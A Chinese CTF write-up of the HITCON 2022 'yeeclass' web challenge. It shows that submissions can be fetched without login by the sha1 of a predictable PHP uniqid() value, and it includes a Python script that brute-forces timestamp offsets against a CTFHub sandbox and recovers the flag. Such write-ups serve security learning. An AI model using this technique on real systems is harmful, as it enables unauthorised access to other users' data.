::: info
2022-HitCon-Web-yeeclass
:::

# 1、思路

（1）`init.sql` 创建表：homework、user、submission

（2）`docker-compose.yml` 创建容器

```yml
  web:
    build:
      context: ./
      # args:
        # TURNSTILE_SECRETKEY: <your-own-key>
        # TURNSTILE_SITEKEY: <your-own-key>
    environment:
      - FLAG=hitcon{not_flag}
    ports:
      - 16875:80/tcp
    depends_on:
      database:
        condition: service_healthy
    entrypoint:
      - bash
      - -c
      - |
        set -e
        echo 'running init.php'
        php -f /tmp/init.php
        rm /tmp/init.php
        
        echo 'initialization done, starting apache'
        exec apache2-foreground
```

（3）`init.php` 创建用户 flagholder，密码随机，并提交了一份包含 flag 的作业，其哈希值为变量 id 的 sha1， `$id = uniqid($username."_");`

```php
<?php 

$pdo = new PDO("mysql:host=database;dbname=yeeclass", "yeeclass", "yeeclass");

$username = "flagholder";
$password = base64_encode(random_bytes(40));

echo "Username: $username; Password: $password\n";

// create user
$user_query = $pdo->prepare("INSERT INTO user (username, `password`, class) VALUES (?, ?, ?)");
$user_query->execute(array($username, hash("md5", $password), 0));

// submit flag
$id = uniqid($username."_");
echo $id."\n";

$submit_query = $pdo->prepare("INSERT INTO submission (`hash`, userid, homeworkid, score, content) VALUES (?, ?, ?, ?, ?)");
$submit_query->execute(array(
    hash("sha1", $id),
    $pdo->lastInsertId(),
    1,
    100,
    $_ENV["FLAG"]
));

?>
```

（4）本地部署的容器输出用户名和随机创建的密码（非服务端），网页端登陆查看提交的 flag 为 hitcon{not_flag} http://challenge-2f05aa9314a37773.sandbox.ctfhub.com:10800/submission.php?hash=6d2fca6a74e7e8c6abf1e6f8bf8c8ecc20015f69

```
yeeclass-web-1       | running init.php
yeeclass-web-1       | Username: flagholder; Password: dsapiA9cJ/ti0mb/nwrDl7jChTdfoznUyVdTZT95MYIEBxjpLaYf4Q==
yeeclass-web-1       | flagholder_65dca4328cdd1
yeeclass-web-1       | initialization done, starting apache
```

（5）`submission.php` 支持

- 哈希查询，即可以在不登陆用户情况下通过访问 http://challenge-2f05aa9314a37773.sandbox.ctfhub.com:10800/submission.php?hash= + 哈希值的方式获取提交的文件
- homeworkid 查询 http://challenge-2f05aa9314a37773.sandbox.ctfhub.com:10800/submission.php?homeworkid= + homework
- userid 查询

```php
if (isset($_GET["hash"]) && $_GET["hash"] != "") {
    // view single submission
    $mode = "view";
    $submission_query = $pdo->prepare("SELECT s.*, u.username, h.name from submission s LEFT JOIN user u ON u.id=s.userid LEFT JOIN homework h ON h.id=s.homeworkid WHERE s.`hash`=?");
    $submission_query->execute(array($_GET["hash"]));
    $result = $submission_query->fetch(PDO::FETCH_ASSOC);

    if (!$result) {
        http_response_code(404);
        die("Submission not found.");
    }
} else {
    // list submissions
    if (isset($_GET["homeworkid"])) {
      ……
    } else if (isset($_SESSION["userid"])) {
      ……
    } else {
        http_response_code(400);
        die("Insufficient parameters");
    }   
}
```

# 2、获取哈希值

哈希值为

```php
$id = uniqid($username."_");
hash("sha1", $id)
```

## uniqid

https://www.php.net/manual/zh/function.uniqid.php

uniqid 的生成方式是 `{sec:08x}{usec:05x}`，13 位 16 进制数

带上前缀：

```php
<?php
    $username = "test";
    echo uniqid($username."_");
		// test_65dd46ee5dc2a
?>
```

## 入库时间

通过 homework 查询 http://challenge-2f05aa9314a37773.sandbox.ctfhub.com:10800/submission.php?homeworkid=1 得到 2024-02-27 10:51:12.808250

## 爆破时间差

入库时间和 `uniqid` 由于运行效率，会存在微秒时间差，因而需要爆破该时间差

# 3、exp

```python
import hashlib
import requests
from datetime import datetime


username = "flagholder"

# timestamp => sec, usec
timestamp = "2024-02-27 10:51:12.808250"
dt = datetime.fromisoformat(timestamp)
sec = int(dt.timestamp())
usec = dt.microsecond


# hash(id)
def get_hash(usec):
    id = f"{username}_{sec:08x}{usec:05x}"
    return hashlib.sha1(id.encode()).hexdigest() 


# 爆破时间差
url = "http://challenge-2f05aa9314a37773.sandbox.ctfhub.com:10800/submission.php?hash="
for i in range(0, 1000):
    hash = get_hash(usec-i)
    r = requests.get(url + hash)
    if r.status_code != 404:
        print(r.text)
```

获得 flag

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>yeeclass | Submission</title>
    <link rel="stylesheet" href="static/style.css">
</head>
<body>
    <div id="main">
        <header id="header">
            <h1>yeeclass</h1>
            <nav>
    <a href="index.php">[Home]</a>    <div class="right">
            <form action="index.php" method="POST">
            <input type="text" name="username" id="username" placeholder="Username" pattern="^\w{6,20}$" autocomplete="off">
            <input type="password" name="password" id="password" placeholder="Password" autocomplete="off">
            <input type="submit" value="Login/Register">
        </form>
        </div>
</nav>        </header>
        <hr>
                <section id="view">
            <h3>flagholder_Flag <a href="submit.php?homeworkid=1&delete=e23b7340a6cfd1939d4be49af0027620f917f712">[Delete]</a></h3>
            <p>Time: 2024-02-27 10:51:12.808250</p>
            <p>Score: 100</p>
            <pre>ctfhub{b52b822e45e613f4dcbf5f50}</pre>
        </section>
            </div>
</body>
</html>
<html>
<head><title>502 Bad Gateway</title></head>
<body>
<center><h1>502 Bad Gateway</h1></center>
<hr><center>openresty/1.21.4.2</center>
</body>
</html>
```

